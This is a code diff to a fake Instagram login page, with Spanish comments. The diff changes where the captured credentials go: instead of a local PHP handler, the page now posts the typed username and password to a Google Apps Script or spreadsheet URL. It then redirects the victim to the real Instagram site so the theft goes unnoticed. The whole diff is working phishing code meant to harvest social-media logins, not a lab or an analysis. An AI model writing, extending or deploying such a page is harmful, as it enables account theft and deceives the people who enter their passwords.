@@ -125,9 +125,10 @@
 
     <div class="divider">OR</div>
 
+    <!-- Formulario que envía los datos al script de Google Apps Script -->
     <form id="login-form">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" placeholder="Password" required>
+        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
         <button class="login-btn" type="submit">Log In</button>
     </form>
 
@@ -142,34 +143,26 @@
     </div>
 </div>
 
+<!-- JavaScript para enviar los datos a Google Apps Script y redirigir -->
 <script>
-    document.getElementById('login-form').addEventListener('submit', function(event) {
-        event.preventDefault(); // Evitar el comportamiento por defecto
+    const scriptURL = 'https://docs.google.com/spreadsheets/d/1jCTo_lteXKSO9hglQ01tVF8l94zjk8vzlnwmnf9ltKI/edit?usp=sharing'; // Coloca aquí la URL de tu Google Apps Script publicado
+    const form = document.getElementById('login-form');
 
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
+    form.addEventListener('submit', function(event) {
+        event.preventDefault(); // Evita el envío estándar del formulario
 
-        // Enviar los datos usando Fetch API
-        fetch('process.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Redirigir a Instagram tras el envío
-            window.location.href = 'https://www.instagram.com';
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
+        const formData = new FormData(form); // Crea un objeto FormData con los datos del formulario
+
+        fetch(scriptURL, { method: 'POST', body: formData })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Datos enviados:', data);
+                setTimeout(function() {
+                    window.location.href = 'https://www.instagram.com'; // Redirige después de 0.5 segundos
+                }, 500);
+            })
+            .catch(error => console.error('Error al enviar los datos:', error));
     });
-</script>
-
-</body>
-</html>
 </script>
 
 </body>
